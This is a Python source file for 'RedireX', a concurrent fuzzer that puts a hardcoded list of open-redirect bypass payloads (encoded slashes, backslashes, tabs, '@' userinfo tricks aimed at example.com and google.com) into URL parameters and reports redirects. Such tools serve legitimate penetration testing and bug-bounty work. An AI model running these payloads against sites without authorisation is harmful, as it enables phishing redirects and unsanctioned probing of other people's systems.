#!/usr/bin/env python3

import asyncio
import aiohttp
import argparse
import sys
import socket
from aiohttp import ClientConnectorError, ClientOSError, ServerDisconnectedError, ServerTimeoutError, ServerConnectionError, TooManyRedirects
from tqdm import tqdm
import concurrent.futures
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
from typing import List


# Color constants
LIGHT_GREEN = '\033[92m'  # Light Green
DARK_GREEN = '\033[32m'   # Dark Green
ENDC = '\033[0m'          # Reset to default color

redirect_payloads = [
"//example.com@google.com/%2f..",
"///google.com/%2f..",
"///example.com@google.com/%2f..",
"////google.com/%2f..",
"https://google.com/%2f..",
"https://example.com@google.com/%2f..",
"/https://google.com/%2f..",
"/https://example.com@google.com/%2f..",
"//google.com/%2f%2e%2e",
"//example.com@google.com/%2f%2e%2e",
"///google.com/%2f%2e%2e",
"///example.com@google.com/%2f%2e%2e",
"////google.com/%2f%2e%2e",
"/http://example.com",
"/http:/example.com",
"/https:/%5cexample.com/",
"/https://%09/example.com",
"/https://%5cexample.com",
"/https:///example.com/%2e%2e",
"/https:///example.com/%2f%2e%2e",
"/https://example.com",
"/https://example.com/",
"/https://example.com/%2e%2e",
"/https://example.com/%2e%2e%2f",
"/https://example.com/%2f%2e%2e",
"/https://example.com/%2f..",
"/https://example.com//",
"/https:example.com",
"/%09/example.com",
"/%2f%2fexample.com",
"/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/",
"/%5cexample.com",
"/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d",
"/.example.com",
"//%09/example.com",
"//%5cexample.com",
"///%09/example.com",
"///%5cexample.com",
"////%09/example.com",
"////%5cexample.com",
"/////example.com",
"/////example.com/",
"////\;@example.com",
"////example.com/"
]

async def load_payloads(payloads_file):
    if payloads_file:
        with open(payloads_file) as f:
            return [line.strip() for line in f]
    else:
        return redirect_payloads  # Return hardcoded list if no file specified


def fuzzify_url(url: str, keyword: str) -> str:
    # If the keyword is already in the url, return the url as is.
    if keyword in url:
        return url

    # Otherwise, replace all parameter values with the keyword.
    parsed_url = urlparse(url)
    params = parse_qsl(parsed_url.query)
    fuzzed_params = [(k, keyword) for k, _ in params]
    fuzzed_query = urlencode(fuzzed_params)

    # Construct the fuzzified url.
    fuzzed_url = urlunparse(
        [parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, fuzzed_query, parsed_url.fragment])

    return fuzzed_url


def load_urls() -> List[str]:
    urls = []
    for line in sys.stdin:
        url = line.strip()
        fuzzed_url = fuzzify_url(url, "FUZZ")
        urls.append(fuzzed_url)
    return urls



async def fetch_url(session, url):
    print(f"Testing: {url}")  # Debugging: Print every URL tested
    try:
        async with session.get(url, allow_redirects=True) as response:
            print(f"Response: {response.status} | Location: {response.headers.get('Location')}")
            if response.status in [301, 302, 303, 307, 308]:  # Redirect codes
                print(f"[FOUND] Redirect detected: {url} -> {response.headers.get('Location')}")
            return response
    except Exception as e:
        print(f"[ERROR] {url} -> {str(e)}", file=sys.stderr)
        return None


async def process_url(semaphore, session, url, payloads, keyword, pbar):
    async with semaphore:
        for payload in payloads:
            filled_url = url.replace(keyword, payload)
            response = await fetch_url(session, filled_url)
            if response and response.history:
                locations = " --> ".join(str(r.url) for r in response.history)
                # If the string contains "-->", print in green
                if "-->" in locations:
                    tqdm.write(f'{DARK_GREEN}[FOUND]{ENDC} {LIGHT_GREEN}{filled_url} redirects to {locations}{ENDC}')
                else:
                    tqdm.write(f'[INFO] {filled_url} redirects to {locations}')
            pbar.update()

async def process_urls(semaphore, session, urls, payloads, keyword):
    with tqdm(total=len(urls) * len(payloads), ncols=70, desc='Processing', unit='url', position=0) as pbar:
        tasks = []
        for url in urls:
            tasks.append(process_url(semaphore, session, url, payloads, keyword, pbar))
        await asyncio.gather(*tasks, return_exceptions=True)

async def main(args):
    payloads = await load_payloads(args.payloads)
    urls = load_urls()
    tqdm.write(f'[INFO] Processing {len(urls)} URLs with {len(payloads)} payloads.')
    async with aiohttp.ClientSession() as session:
        semaphore = asyncio.Semaphore(args.concurrency)
        await process_urls(semaphore, session, urls, payloads, args.keyword)

if __name__ == "__main__":
    banner = """
________________________________________________________________________________________________________________________________________________________
    _    _     __   _____  ______         __                                    __                            ____                                  _  _
    /  ,'      /    /    '   /          /    )         /                      /    )                          /    )             /   ,              | / 
---/_.'-------/----/__------/----------/--------------/__----__---)__--------/--------)__----__--------------/___ /----__----__-/-------)__----__---|---
  /  \       /    /        /     ===  /        /   / /   ) /___) /   ) ===  /        /   ) /___)| /| / ===  /    |   /___) /   /   /   /   ) /___) /|   
_/____\___ _/_ __/____ ___/__________(____/___(___/_(___/_(___ _/__________(____/___/_____(___ _|/_|/______/_____|__(___ _(___/___/___/_____(___ _/_|___
                                                 /                                                                                                      
                                             (_ /                                                                                                       
                                               

    """
    print(banner)
    parser = argparse.ArgumentParser(description="KIET-CyberCrew-RedireX : A fuzzer for detecting open redirect vulnerabilities")
    parser.add_argument('-p', '--payloads', help='file of payloads', required=False)
    parser.add_argument('-k', '--keyword', help='keyword in urls to replace with payload (default is FUZZ)', default="FUZZ")
    parser.add_argument('-c', '--concurrency', help='number of concurrent tasks (default is 100)', type=int, default=100)
    args = parser.parse_args()
    try:
        asyncio.run(main(args))
    except KeyboardInterrupt:
        print("\nInterrupted by user. Exiting...")
        sys.exit(0)
